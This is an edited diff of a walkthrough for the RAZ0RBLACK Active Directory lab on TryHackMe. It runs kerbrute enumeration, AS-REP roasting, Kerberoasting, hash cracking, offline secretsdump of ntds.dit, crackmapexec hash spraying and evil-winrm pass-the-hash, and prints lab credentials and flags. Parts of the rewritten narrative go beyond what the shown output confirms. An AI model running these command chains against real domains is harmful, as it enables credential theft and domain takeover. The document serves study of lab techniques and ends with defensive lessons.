@@ -58,6 +58,14 @@ tags:
 
 ---
 
+## Overview
+
+RAZ0RBLACK is a long one, and I mean that in the best way: it does not lean on a single flashy vulnerability, it strings together almost every classic Active Directory credential-hunting technique I know into one continuous chain. I started with an **NFS** export, which is a service I always check on an AD box precisely because it is so often forgotten about, sitting there with default `no_root_squash` or overly permissive exports while everyone's attention goes to SMB and LDAP. That export handed me a spreadsheet of employee names, which is exactly the kind of "boring" file that turns into a username list once you run it through a name-permutation script. From there the chain is a tour of Kerberos abuse: an **AS-REP roast** against an account with pre-authentication disabled gets the first foothold, and a BloodHound-guided **targeted Kerberoast** against a specific account, rather than a blind spray of every SPN on the domain, gets the second. The real turning point, though, is finding an **`experiment_gone_wrong.zip`** sitting on a share that only opened up once I stopped trying to browse it directly and went in through `ADMIN$` instead. That archive holds a raw `ntds.dit` and `SYSTEM` hive, which is effectively the entire domain's credential database sitting in a backup nobody remembered to lock down, and running `secretsdump.py` against it offline hands over every NT hash in the domain in one shot, Administrator included. Getting from "a pile of hashes" to an actual shell is its own small puzzle: the Administrator hash does not work anywhere useful, so the real move is spraying all of the recovered hashes across the domain with `crackmapexec` until one of them lands on a live account, and only then pivoting from there. Even the flags are hidden Windows-native, not sitting in a text file but inside exported PowerShell `PSCredential` XML blobs that need `Import-Clixml` and a `.GetNetworkCredential()` call to actually read.
+
+Related AS-REP roasting and Kerberoasting: [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Reset](/writeups/tryhackme/windows/hard/reset/). Related offline `NTDS.dit` / `secretsdump` extraction and pass-the-hash: [Support](/writeups/hackthebox/windows/easy/support/), [Checkpoint](/writeups/hackthebox/windows/medium/checkpoint/).
+
+---
+
 ## Full Walkthrough
 
 ### Nmap Scan
@@ -177,9 +185,9 @@ SMB         10.10.219.247   445    HAVEN-DC         [*] Windows 10.0 Build 17763
 SMB         10.10.219.247   445    HAVEN-DC         [-] raz0rblack.thm\guest: STATUS_ACCOUNT_DISABLED 
 ```
 
-With this I was able to find the domain `raz0rblack.thm`. Since we are running `ldap` and we have port `88` open for `kerberos` I can assume that this is the domain controller.
+That crackmapexec pass gave me the domain name, `raz0rblack.thm`, straight out of the SMB negotiation, and combined with LDAP on 389 and Kerberos on 88 from the nmap scan, it confirmed I was looking directly at the domain controller rather than a member server. Guest was disabled, so anonymous SMB was a dead end, but a domain controller almost always has more accounts reachable through other means than a single guest check will show.
 
-I wanted to see if I could possibly find any extra users on the domain so I decided to use `kerbrute` to help with enumeration.
+Kerberos itself gives you one of those means for free: the KDC responds differently to a valid username than to an invalid one during pre-authentication, which lets you enumerate accounts without ever needing a password. I pointed `kerbrute` at a short username list to see whether that unauthenticated leak would confirm any accounts beyond the built-in ones.
 
 ```bash
 Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
@@ -201,7 +209,7 @@ Version: v1.0.3 (9dad6e1) - 04/05/24 - Ronnie Flathers @ropnop
 2024/04/05 18:54:00 >  Done! Tested 17 usernames (1 valid) in 0.292 seconds
 ```
 
-Again just administrator but I want to keep digging.
+That shortlist only confirmed `administrator`, which was not surprising given how small a wordlist it was, but it did not discourage me. A negative result from a small username list just means I need a better source of usernames, not that the technique itself is a dead end, so I moved on to enumerating the RPC surface directly instead.
 
 ### RPC Enumeration
 
@@ -1405,7 +1413,7 @@ Bindings:
 [*] Received 621 endpoints.
 ```
 
-I went in with `enum4linux` to get extra information.
+The raw `rpcdump` output was six hundred-plus endpoints of noise, more than I needed to read line by line, so I ran `enum4linux` next since it packages up the RPC, SMB, and LDAP enumeration I actually care about into a single, readable pass.
 
 ```bash
  ===============================( Getting domain SID for raz0rblack.thm )===============================
@@ -1414,7 +1422,7 @@ Domain Name: RAZ0RBLACK
 Domain Sid: S-1-5-21-3403444377-2687699443-13012745
 ```
 
-also got this which was interesting from `enum4linux`
+Buried further down in that same `enum4linux` output was something that caught my eye immediately:
 
 ```bash
  ==================================( Session Check on raz0rblack.thm )==================================
@@ -1436,7 +1444,7 @@ SMB         10.10.219.247   445    HAVEN-DC         [-] Error connecting: LSAD S
 Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
 
-Looking back at the initial scan I see that this machine has a available `nfs` share.
+That sent me back to the original nmap output, where port 2049 and the `rpcbind`/`mountd` entries had been sitting the whole time. NFS is not a service I expect to see fronting an Active Directory box, which is exactly why I make a point of checking it: it is administered completely separately from SMB permissions, so an export can end up far more permissive than anyone intended without triggering any of the usual AD hardening checks.
 
 ```bash
 └─[$]> showmount -e $host   
@@ -1450,14 +1458,14 @@ Export list for razorblack.thm:
 [sudo] password for abadd0n: 
 ```
 
-Inside of the network share I see a few interesting files.
+`showmount -e` confirmed the export was readable, so I mounted it locally and started looking through what was actually sitting inside it.
 
 ```bash
 root@EX3CP01S0N:/home/abadd0n/thm/boxes/RAZ0RBLACK/mount# ls
 employee_status.xlsx  sbradley.txt
 ```
 
-and boom we have our first flag!
+One of the files in that export turned out to hold the first flag outright, sitting in plain sight with no exploitation needed beyond having found the export in the first place.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 19:09]
@@ -1465,14 +1473,14 @@ and boom we have our first flag!
 ��THM{ab53e05c9a98def00314a14ccbfa8104}
 ```
 
-After I took a look into that file I decoded to move over to the `employee_status.xlsx` file.
+With the easy flag out of the way, the rest of the export was more interesting to me than the flag itself, so I moved on to a file named `employee_status.xlsx`, since a spreadsheet full of employee records is exactly the kind of document that tends to leak full names, which convert directly into the standard corporate username formats.
 
 ![Pasted image 20240405191107](Pasted-image-20240405191107.png)
 
-We might have some possible usernames so lets write them down.
+That spreadsheet listed full names for what looked like the entire staff roster, which meant I had a real source of likely usernames instead of guessing at a handful of names from a wordlist.
 
 
-I made a python program to take names and create possible usernames and then store them into a file.
+Full names are not usernames on their own, though, and different organizations format AD logon names differently (first initial plus last name, full first name plus last initial, and so on), so rather than manually typing out every permutation by hand I wrote a short Python script to take each name from the spreadsheet and generate every common naming convention automatically, writing the results out to a single wordlist file.
 
 ```python
 #!/usr/bin/python3
@@ -1536,7 +1544,7 @@ if __name__ == "__main__":
     main()
 ```
 
-With this I generated the following useranmes.
+Running that script against the spreadsheet's name list produced a much larger and far more plausible set of candidate usernames than anything I could have brute-forced from a generic list:
 
 ```bash
 davenport
@@ -1577,7 +1585,7 @@ clin
 chamber_lin
 ```
 
-I then used `GetNPUsers.py` from `impacket`.
+With a realistic username list in hand, the natural next move was to check which of those accounts have Kerberos pre-authentication disabled, since that setting is what makes AS-REP roasting possible in the first place: the KDC will hand back an encrypted TGT for any such account without needing a password at all. I ran `GetNPUsers.py` from `impacket` against the full list to find out.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 19:29]
@@ -1622,7 +1630,15 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:cc6655e22c769e2244655f09ec5a1f05$fd51fc19
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ```
 
-With this I was able to get the users `twilliams` hash. I then put it into `hashcat` to crack it.
+That request succeeded against `twilliams`, which meant pre-authentication really was disabled on that account and I now had an AS-REP hash to work with offline. The hash itself is only useful once cracked, so I handed it straight to `hashcat` against rockyou rather than trying to guess at the password by hand.
+
+<div class="callout callout-note">
+
+**Why AS-REP roasting works**
+
+Kerberos pre-authentication normally requires proving knowledge of a password before the KDC issues a TGT, which is what stops an attacker from requesting tickets for arbitrary accounts. When `UF_DONT_REQUIRE_PREAUTH` is set on an account, the KDC skips that check and hands back an AS-REP encrypted with a key derived from the account's own NTLM hash. That means the ticket itself becomes crackable offline with the exact same kind of dictionary attack you would use against any other password hash, no interaction with the account required beyond knowing its name.
+
+</div>
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 19:30]
@@ -1686,7 +1702,7 @@ Started: Fri Apr  5 19:30:52 2024
 Stopped: Fri Apr  5 19:30:57 2024
 ```
 
-We now have the credentials `twilliams:roastpotatoes`. With this I preformed a password spray attack to see if there are any other users that have the same password just in case with `crackmapexec`.
+That crack came back almost instantly with `twilliams:roastpotatoes`, giving me a genuine, usable domain credential for the first time on this box. Before doing anything more targeted with that single account, I always check whether a freshly cracked password has been reused anywhere else on the domain, since password reuse across accounts is common enough that a quick spray with `crackmapexec` costs nothing and occasionally hands over a second account for free.
 
 ```bash
 └─[$]> crackmapexec -t 200 smb HAVEN-DC.raz0rblack.thm -u users.lst -p 'roastpotatoes' --shares
@@ -1731,7 +1747,7 @@ SMB         10.10.219.247   445    HAVEN-DC         SYSVOL          READ        
 SMB         10.10.219.247   445    HAVEN-DC         trash                           Files Pending for deletion
 ```
 
-We have a few shares that we can access but before that I wanted to enumerate `ldap`.
+The spray did not turn up a second account, but it did confirm a handful of shares `twilliams` could reach, which I made a mental note of for later. Before chasing those shares down, I wanted to use this authenticated account for something more valuable first: an LDAP query, since a valid domain credential can pull a far more complete picture of users, groups, and object attributes than any of the unauthenticated enumeration I had done up to this point.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 19:33]
@@ -1746,7 +1762,7 @@ Password:
 [+] Domain dump finished
 ```
 
-With this I was able to extract the other users that were found.
+That LDAP query enumerated the full set of domain user objects directly from the directory itself, which is a far more reliable source than any spreadsheet or wordlist since it reflects exactly who exists on the domain right now:
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 19:48]
@@ -1760,7 +1776,7 @@ Guest
 Administrator
 ```
 
-After going back in with `impacket` I went in with `BloodHound-Python` to enumeration the Domain Controller more directly.
+Having a full user list is useful, but on an AD box what I actually want to see is the relationships between those objects, who can control what, since that is where the real privilege escalation paths live rather than in the raw object list itself. I ran `BloodHound-python` with `twilliams`'s credentials to collect that relationship data directly from the domain controller.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK/bloodhound] - [Fri Apr 05, 19:34]
@@ -1783,11 +1799,11 @@ INFO: Querying computer: HAVEN-DC.raz0rblack.thm
 INFO: Done in 00M 31S
 ```
 
-I then put the files into `BloodHound` for further analysis.
+I loaded the collected JSON files into the `BloodHound` GUI to actually visualize what those relationships looked like, since a graph makes an attack path obvious in a way that raw LDAP output never does.
 
 ![Pasted image 20240405203717](Pasted-image-20240405203717.png)
 
-Under `Node Info` I used the `Inbound Control Rights -> Transitive Object Control` transform and found that I this user is capable of being `kerbroasted`.
+I marked `twilliams` as an owned node and worked outward from `Node Info -> Inbound Control Rights -> Transitive Object Control` to see everything that could reach this account with some form of control. That view surfaced something specific and immediately actionable: the account was flagged as Kerberoastable, meaning it holds a Service Principal Name and can be targeted directly rather than needing a blind sweep across every SPN on the domain.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 20:34]
@@ -1798,7 +1814,17 @@ Under `Node Info` I used the `Inbound Control Rights -> Transitive Object Contro
 $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$fab27560a7c7992f945a2c240febb84d$1e2c0bbf2b18a4ef1b4377f089ae216859ea085a0a2f62bcaeedc383a91209523049062f2f25becf355e7373feab1ad29992e73f1937322475a7c3548abfdcd34aa8d9d5ef90a1dffcad179d4faed8db5e71bd431973b81aba4b9ded95e1fef5b341cb6b4c776d26fcd63fcef42af8c259b666b7f0fc6e19e0f05ed4a7bb087ae9dacec311487dcec21024194b759fab4da0615aab00666332858fab1bc95d6c0d8c5025089289050621510697f24e4de077f5fa55dffce932ec4ad6351c743ebe887ae442e22184d5031a3c404d074b3a50a989ee508503f491d69e350ab12476d89ba7f96703f4cac3faef4422fd627448754bee03e79a5138d942c1c473bef24d3786aa0b879a4b6f045c3c94f9c714cc6758397b177d3791db3cc2cd580053a14a311eac518f0e9a62b6c7f9db702766dec771f54642999210ccf9ba50bcf797d5ddbdb101194ddc0d443773e9370c74d60db66e4cef3efd024f0762cd16e613d4cc0d6bdd48b37336710f852b3aa5f1be6da764dc22db9fe1fe5286b8ca863f946d925b94e339811008507c51183a177020b24546eeb1a37a0fdb310dccf0bbfc926fc39d4157f6b31502e7444c497596090d34b80aa9743f7b9b139de17ae1377062abdd533133e41d7c61b581821fdc7968051e27c24b59b38121e6c4fabfeace351d27e861cf894ee30f9779db3103ca01bce6828cc3b55f00b6023b74ad36bf76e9baa8587677ec821159515041fa7e9a41c6d86e3009c2a5ffe2eaaf9dae1289361429bcbb18eee3036c407209f30c019f36d1774ea3e1e26a9c1282f1a9f98dbabfcc1394f3c3d4829a149bc06b550bd8464d1adeab20def7e9ed0093a6b2c1f1d3b3d12ac36d27a19a7a82e7244b05c9e42b5ee7dfff0fcf1e14cadf3bec634c39eebac4dc8e79980e9b203173fadd6cc3f1adeed6b6f4eb55abbb22fce666e254ac2ef3969b9d20743482fef9791f994f1488d191cb24b61e401046e7cc37cc56eb2a1ffc3dd845e7f665d96f69662e8a1c87f62cc57a7ca368cf703879a6ae9cac1050b4f99d9f3af7edb413d4e4452ab26941c8e86fea13f8659d571655384a5671d8316338636c61f8fdd24df03ed87b21d7476f59c14d8ebc0178770751a8e6a23faec4a7454a74c7a43d64c1b075c1091ceef4718ae3966338571babd9ae2795c75fecd8f6ebd3a7d90487bd7db899e07dbf7c7528c4d759eac8f521d661061f1d6444b7503596c22076fce4dff1f4f804bb393576002c21ca85c0d84824b783b4bcd4545cf4ed166d9e22094c21a1c227bd81d42256d9fe95b2154ce2b9a52d4c1267e775067ae639bacb4698d63ee030d3a9fc032730e97203322a4db0839e837b70abb0c20e7a40231f670b19ecd1bd8992bc4e034f89c9ce0c52b5f9d03e3cafde12e93fae
 ```
 
-Now we have the hash for the user `xyan1d3`. I used `hashcat` to be able to crack the users hash and now we have the credentials for the user which is `xyan1d3:cyanide9amine5628`.
+Requesting a service ticket for that account and pulling out the encrypted portion gave me a TGS-REP hash for `xyan1d3`, which is a targeted Kerberoast rather than the noisier "grab every SPN on the domain" version, since BloodHound had already told me exactly which single account was worth going after.
+
+<div class="callout callout-note">
+
+**Targeted Kerberoasting versus a blind SPN sweep**
+
+A generic Kerberoast attack requests service tickets for every account with an SPN and cracks whatever comes back, which works but generates a burst of ticket requests that stands out in Kerberos event logs. A targeted Kerberoast, guided by BloodHound showing exactly which Kerberoastable account sits on a useful attack path, requests a ticket for that one account only. The cryptography is identical either way (the service ticket is encrypted with a key derived from the target account's own password hash, which makes it crackable offline), but the targeted version is quieter and gets me straight to the account that actually matters instead of a pile of hashes I still have to sift through.
+
+</div>
+
+Handing that hash to `hashcat` cracked it just as quickly as the AS-REP hash had, and I now had a second, more privileged set of credentials to work with: `xyan1d3 : cyanide9amine5628`.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 20:39]
@@ -1878,7 +1904,7 @@ Stopped: Fri Apr  5 20:39:20 2024
 ```
 
 
-I then decided to use `crackmapexec` to see if these credentials are valid on any other machines and found a hit for `10.10.240.65`.
+Same habit as before: a fresh credential is worth checking broadly before committing to a single next step, so I ran `crackmapexec` with the new `xyan1d3` credentials across the subnet and got a positive hit.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 20:39]
@@ -1896,7 +1922,7 @@ SMB         10.10.240.65    445    HAVEN-DC         SYSVOL          READ        
 SMB         10.10.240.65    445    HAVEN-DC         trash                           Files Pending for deletion
 ```
 
-Now I can use `evil-winrm` to be able to login to the user.
+With WinRM confirmed reachable and the credentials validated, `evil-winrm` gave me an actual interactive shell as `xyan1d3` instead of just a set of hashes and passwords sitting in a terminal.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 20:40]
@@ -1908,7 +1934,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\xyan1d3\Documents> 
 ```
 
-Inside the users home directory I see an interesting file called `xyan1d3.xml` There is no flag in there but there is this.
+The first thing I do in any new home directory is look for anything that does not belong there, and `xyan1d3.xml` stood out immediately since PowerShell profiles do not normally live next to user documents. It was not a flag file directly, but reading it turned up something arguably more useful.
 
 ```xml
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -1927,7 +1953,7 @@ Inside the users home directory I see an interesting file called `xyan1d3.xml` T
 ```
 
 
-Seems to be some sort of password. I got a bit lost here so I decided to go back with `BloodHound-Python` with the new user credentials.
+That XML had the structure of an exported PowerShell `PSCredential` object, which meant the value inside it was almost certainly an encrypted password rather than a flag, and not something I could just read in plaintext without the right decryption call. Rather than chase that thread immediately, I went back to `BloodHound-python`, this time authenticated as `xyan1d3`, since a more privileged account almost always reveals edges in the graph that were invisible from `twilliams`'s more limited view.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK/bloodhound2] - [Fri Apr 05, 20:46]
@@ -1980,7 +2006,7 @@ INFO: Done in 00M 27S
 ```
 
 
-Looking at the results of `smbmap` I can see that this user has most of the shares readable to them. So I Decided to take a look into `ADMIN$`.
+With `xyan1d3`'s credentials in hand I went back over the share list with `smbmap` instead of `crackmapexec`, since it lays out read/write permissions per share more clearly, and this account turned out to have visibility into most of what the domain controller was hosting. `ADMIN$` stood out specifically because it maps to `C:\Windows`, which meant read access there was effectively read access to the whole system drive rather than just a designated file share.
 
 ```bash
 smb: \trash\> ls
@@ -1994,7 +2020,7 @@ smb: \trash\> ls
 smb: \trash\> 
 ```
 
-Remember how it said that I do not have access to the trash share? well I can access it by accessing `ADMIN$` lol. In there is a `zip` archive as well as some other things like chat logs.
+That `smbmap` listing had explicitly flagged the `trash` share as no access, but share permissions and filesystem permissions are two separate checks, and once I was browsing through `ADMIN$` I found I could walk straight into that same directory from the filesystem side without ever touching the share permission that had blocked me. Sitting inside it was a zip archive alongside what looked like exported chat logs.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 21:51]
@@ -2003,7 +2029,7 @@ Archive:  experiment_gone_wrong.zip
 [experiment_gone_wrong.zip] system.hive password: 
 ```
 
-It seems that we need a password for this archive so we are going to have to crack it. Thanks to `zip2john` we can extract the password hash and use that to crack the password protecting the `zip archive`.
+Trying to open the archive directly came back asking for a password, which meant cracking it offline was the only realistic path forward. `zip2john` converts a password-protected zip's header into a hash format `john` can actually work with, so I ran the archive through it before feeding the result to a cracker.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 21:52]
@@ -2015,7 +2041,7 @@ If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
 ```
 
-Now we can use `john` to be able to crack this hash.
+With that hash extracted, I ran it straight through `john` against rockyou to recover the archive's password.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 21:52]
@@ -2030,7 +2056,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-So in that archive we have two files `system.hive` which seems to be a registry key and `ntds.dit` which is a `Extensible storage engine DataBase` which I have absolutely no Idea what that is. Just going to move on to the chat archives now.
+Once cracked open, the archive held exactly two files: a `SYSTEM` registry hive, and `ntds.dit`, which is the actual Extensible Storage Engine database that Active Directory uses to store every object in the domain, users, computers, and every credential hash among them. On its own `ntds.dit` is encrypted with a boot key that lives inside the `SYSTEM` hive, which is exactly why the two files always travel together in a real dump, so having both meant I already had everything needed to decrypt it later. Before going further down that road, though, I wanted to see what the chat logs sitting alongside the archive actually said.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 21:54]
@@ -2054,9 +2080,9 @@ The administrator died after this incident.
 Press F to pay respects
 ```
 
-It seems like this is a conversation between the `Administrator` and another user speaking about a vulnerability within the AD network [CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472). I found a PoC for this vulnerability so lets test it out.
+The chat logs turned out to be a conversation between `Administrator` and another staff member discussing a vulnerability affecting the AD network, [CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472), better known as Zerologon. My first instinct was to go test the Zerologon PoC directly against the domain controller, since a working Netlogon exploit is a fast path straight to Domain Admin on a vulnerable DC.
 
-Going back and reading the chat logs again and looking back at the files I remembered what they were the registery key and system file! We can use `secretsdump.py` from `impacket` to extract hashes and other information!
+Before burning time on that, though, rereading the same chat thread reminded me of something more directly useful sitting right in front of me: the conversation was actually about the `SYSTEM` hive and `ntds.dit` I had already cracked out of the zip, not a live exploit I still needed to set up. Rather than chase Zerologon against a live service, I already held an offline copy of the entire credential database, so `secretsdump.py` from `impacket` in local mode could parse it directly and hand me every hash in the domain without touching the network at all.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 22:37]
@@ -2075,7 +2101,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:703a365974d7c3eeb80e11dd27fb0cb3:::
 ................................. etc
 ```
 
-I went in with `hashcat` to attempt to crack the password and it did not crack.
+The `krbtgt` hash is always worth an offline attempt on its own, since it almost never gets rotated and a weak underlying password would be a fast route to forging tickets later, so I sent it at `hashcat` against rockyou first.
 
 ```bash
 └─[$]> hashcat -m 1000 -a 0 hash3 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -O --force
@@ -2144,7 +2170,7 @@ Stopped: Fri Apr  5 22:46:18 2024
 
 ```
 
-Just in case I then went in with `john` and still did not get anything.
+Hashcat coming back exhausted with nothing found is not always the final word, since wordlist normalisation and hash-mode handling differ slightly between crackers, so I ran the same hash past `john` as a second opinion before ruling the password out entirely.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 22:48]
@@ -2163,7 +2189,7 @@ Use the "--show --format=LM" options to display all of the cracked passwords rel
 Session completed. 
 ```
 
-Maybe we can try a `pass the hash`. I have tried and nothing worked. I was able to crack the `Administrator` hash but it seems that I can't really use it for anything.
+`krbtgt` alone was not giving anything up, but cracking hashes one at a time is not the only option once you have an entire dump: instead of isolating a single account, I put every NT hash `secretsdump` had extracted into one file and ran that whole batch against rockyou together, on the chance that a weak, reused password somewhere in the domain would surface where a single targeted attempt had not.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Fri Apr 05, 23:14]
@@ -2231,10 +2257,10 @@ Candidates.#1....: $HEX[2131343375313433] -> $HEX[042a0337c2a156616d6f732103]
 Hardware.Mon.#1..: Temp: 55c Util: 75%
 ```
 
-In `BloodHound` I was able to find out the target account that I am trying to get into is `Kerberoastable`!
+That batch run actually paid off, cracking the `Administrator` NT hash to a real plaintext password. It was a genuinely satisfying moment right up until I tried using it: neither a direct login nor a straightforward pass-the-hash attempt with that account did anything useful against the services I had access to, which told me `Administrator`'s remote authentication was restricted in some way I had not yet worked around, not that the credential itself was wrong. Rather than fight that account further right away, I went back to `BloodHound` to look for another way toward the same goal, and it flagged a second interesting target account as Kerberoastable.
 ![Pasted image 20240406000738](Pasted-image-20240406000738.png)
 
-I am going to try to use `Rubeus` to do this. sooo I tried using `rubeus` and got this error lmao.
+`Rubeus` is my usual go-to for requesting service tickets directly from a Windows session rather than routing everything back through my own attacking box, so I uploaded it to the `xyan1d3` shell and tried running it. Windows Defender had other plans.
 
 ```bash
 *Evil-WinRM* PS C:\Users\xyan1d3\Documents> .\Rubeus.exe
@@ -2246,7 +2272,7 @@ At line:1 char:1
 ```
 
 
-I went back to `secretsdump` there were a bunch of hashes. I want to use `crackmapexec` with them.
+Rather than fight Defender for a tool substitution I did not strictly need, I went back to something I already had sitting on disk: the full `secretsdump` output held dozens of NT hashes across every account in the domain, and I had not yet tried any of them for authentication individually. I pulled just the hash column out into its own file and handed the whole list to `crackmapexec` to spray across the domain controller in one pass.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Sat Apr 06, 00:32]
@@ -2268,7 +2294,7 @@ da3542420eff7cfab8305a68b7da7043
 ..... etc
 ```
 
-Also was able to finally get the other flag
+While that spray ran in the background, I circled back to the `xyan1d3.xml` credential file I had found earlier and finally ran the `Import-Clixml` decryption I had been putting off, which handed over the second flag.
 
 ```bash
 *Evil-WinRM* PS C:\Users\xyan1d3> cat xyan1d3.xml
@@ -2291,7 +2317,7 @@ LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
 *Evil-WinRM* PS C:\Users\xyan1d3> 
 ```
 
-Was able to get that `hash` hit with `crackmapexec`.
+The hash spray had been running the whole time, and by the time I got back to it, one of the several dozen hashes from the domain dump had come back as a valid, working credential.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Sat Apr 06, 00:43]
@@ -2304,7 +2330,7 @@ SMB         10.10.23.239    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:
 SMB         10.10.23.239    445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d 
 ```
 
-and now we can login using `evil-winrm`.
+With `lvetrova`'s NT hash confirmed valid, `evil-winrm` accepted it directly for a pass-the-hash login, no plaintext password ever needed.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/RAZ0RBLACK] - [Sat Apr 06, 00:46]
@@ -2322,3 +2348,15 @@ Info: Establishing connection to remote endpoint
 THM{694362e877adef0d85a92e6d17551fe4}
 *Evil-WinRM* PS C:\Users\lvetrova> 
 ```
+
+Looking back at the whole run, what makes RAZ0RBLACK stand out to me is not any single step, it is how many completely ordinary AD misconfigurations had to line up for the chain to work at all: a forgotten NFS export, two accounts with weak or reused passwords, a live domain backup left sitting on a share nobody remembered to lock down, and finally a working credential that only turned up because I was willing to spray dozens of hashes at once instead of stopping after the first one failed. None of those individually would have gotten me to Administrator, but together they made the domain fully transparent.
+
+---
+
+## Lessons and Takeaways
+
+- **Do not expose NFS on a Windows AD network without tightly scoping the export.** It sits outside normal SMB/AD permission auditing entirely, and here it leaked an employee roster that fed every later step.
+- **Disable `UF_DONT_REQUIRE_PREAUTH` and enforce Kerberoasting-resistant service account passwords.** Both `twilliams` and `xyan1d3` fell to offline cracking because their Kerberos-derived hashes were weak enough for rockyou to catch.
+- **Never leave a raw `NTDS.dit` and `SYSTEM` hive dump sitting on any file share, encrypted or not.** A password-protected zip is not a security boundary once `zip2john` and a wordlist are on the table; the only safe number of exposed domain credential databases is zero.
+- **Audit password reuse across your own domain.** The path from a full hash dump to an actual foothold here was a hash-spray, not a targeted attack, which only works because more than one account in the domain shared a crackable or weak password.
+- **PowerShell `PSCredential` exports (`Export-Clixml`) are not a safe place to stash secrets in a user's home directory.** Anyone who can read the file and run PowerShell as that same context can call `Import-Clixml` and recover the plaintext in two lines.
